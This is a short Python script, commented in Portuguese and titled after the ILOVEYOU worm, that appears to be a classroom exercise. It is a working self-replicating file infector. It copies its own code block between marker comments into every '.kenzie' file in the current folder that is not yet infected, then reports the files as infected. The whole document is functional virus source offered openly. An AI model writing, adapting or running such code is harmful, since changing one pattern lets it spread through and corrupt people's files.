# Malware: ILOVEYOU
# ATOMIC MALWARE

import glob
import re
import sys
import time

###############  MENSAGEM  #################
# message = "ILOVEYOU\n"
#
# for letter in message:
#     sys.stdout.write(letter)
#     sys.stdout.flush()
#     time.sleep(0.2)
###########################################

# o virus começa aqui

# Salvar uma cópia de todas as linhas em uma lista
codigo_do_virus = []

# filtrar todas as linhas que não se encontram no próprio vírus

# capturando o nome de uma arquivo
arquivo_atual = sys.argv[0]

# lendo as linhas do arquivo e salvando em uma lista
virus = open(arquivo_atual, "r")
linhas = virus.readlines()
virus.close()


# checagem de estado
invirus = False
for linha in linhas:
    # procurando pelo começo do arquivo do virus
    if re.search("^# o virus começa aqui", linha):
        invirus = True

    # adicionando linhas maliciosas
    if invirus:
        codigo_do_virus.append(linha)

    # procurando pelo final do arquivo do virus
    if re.search("^# o virus acaba aqui", linha):
        print("Bon voyage!")
        break

programas = glob.glob("*.kenzie")

# verificar e infectar todos os programas que o glob encontrar
for programa in programas:
    file = open(programa, "r")
    codigo_do_programa = file.readlines()
    file.close()

    # depois de verificar cada linha dos programas .txt, verificar se já estão infectados
    isinfected = False
    for linha in codigo_do_programa:
        if re.search("^# o virus começa aqui", linha):
            isinfected = True
            break

    if not isinfected:
        # nova versão com o vírus
        novo_codigo = codigo_do_programa
        novo_codigo.extend(codigo_do_virus)

        file = open(programa, "w")
        file.writelines(novo_codigo)
        file.close()

print("Arquivos infectados")

# o virus acaba aqui
